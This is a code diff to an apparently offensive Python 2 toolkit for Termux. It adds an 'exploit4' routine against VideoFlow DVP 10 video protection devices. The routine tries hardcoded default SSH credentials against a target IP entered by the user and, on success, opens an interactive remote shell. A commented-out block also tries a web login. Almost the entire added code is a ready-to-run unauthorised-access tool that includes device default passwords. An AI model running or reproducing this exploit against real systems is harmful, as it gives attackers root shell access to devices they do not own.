@@ -1,10 +1,10 @@
 #!/data/data/com.termux/files/usr/bin/python2
 # -*- coding: utf-8 -*-
 
-import sys, socket, os
+import sys, socket, os, time, base64, getpass
 
 sys.path.append('/data/data/com.termux/files/usr/share/txtool/core')
-from fungsi import warna, IP, ipv4, finish_exploit
+from fungsi import warna, IP, ipv4, finish_exploit, ssh_shell, txtool_dir
 import sub_menu4 as BACK
 
 try:
@@ -409,3 +409,73 @@ def exploit3():
     except requests.exceptions.RequestException as err:
         print warna.merah + "\n[x]" + warna.tutup, err
         BACK.menu['menu_utama']()
+
+def exploit4():
+    try:
+        import paramiko
+    except ImportError:
+        print(warna.merah + "\n[x] " + warna.tutup + "Error, please install paramiko module. ($ pip2 install paramiko)\n")
+
+    from paramiko.ssh_exception import BadHostKeyException, AuthenticationException, SSHException
+
+    IP()
+    print(warna.kuning + "\n[!]" + warna.tutup + " VideoFlow Digital Video Protection DVP 10 Authenticated Remote Code Execution")
+    print(warna.kuning + "[!]" + warna.tutup + " Affected version : 2.10 (X-Prototype-Version: 1.6.0.2)")
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    _host = raw_input(warna.biru + "\n[+]" + warna.tutup + " Target ip address" + warna.kuning + "  >>  " + warna.tutup)
+    paramiko.util.log_to_file("%s/%s.log" % (txtool_dir, _host))
+    _user = ["""root""",
+             """mom"""]
+    _connection = None
+    p = ["""$1$CGgdGXXG$0FmyyKMzcHgkKnUTZi5r./""",
+         """videoflow"""]
+    _passwords = [line.strip() for line in p]
+    _username = [line.strip() for line in _user]
+    _retries = range(len(_passwords and _username))
+    true_ip = ipv4(_host)
+    if _host == '':
+        empty()
+        BACK.menu['menu_utama']()
+
+    if not true_ip:
+        print(warna.merah + "\n[x] " + warna.tutup + "Wrong ip adress")
+        BACK.menu['menu_utama']()
+
+    print(warna.hijau + "\n[*] " + warna.tutup + "Trying to login")
+    for _pass in _passwords:
+        for _u in _username:
+            try:
+                for x in _retries:
+                    ssh.connect(_host, username=_u, password=_pass, timeout=5)
+                    _connection = True
+                if _connection:
+                    print(warna.hijau + "[*] " + warna.tutup + "Login Success! user: "+_u+" and password: "+_pass)
+                    command = ssh.invoke_shell()
+                    print(repr(ssh.get_transport()))
+                    print(warna.hijau + "[*] " + warna.tutup + "shell has been successfully opened\n")
+                    ssh_shell(command)
+                    command.close()
+                    ssh.close()
+                    finish_exploit()
+                    BACK.menu['menu_utama']()
+
+            except (BadHostKeyException, AuthenticationException,
+                     SSHException, socket.error) as err:
+                print warna.merah + "[x] " + warna.tutup + "An error occured:" ,err
+                time.sleep(1)
+
+    print(warna.merah + "\n[x] " + warna.tutup + "Failed to login, maybe target not vuln")
+    raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+    BACK.menu['menu_utama']()
+
+#    with requests.Session() as s:
+#        url = ("http://%s/login.html" % (target))
+#        header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'}
+#        payload = {'Content-Type': 'text/html;charset=UTF-8',
+#                   'Action': '%s/index.html' % (target), 'Class': "Login",
+#                   'username': 'dancok', 'password' : 'dancok'}
+#        send = s.post(url, headers=header, data=payload, timeout=10)
+#        print send.status_code
+#        print send.content
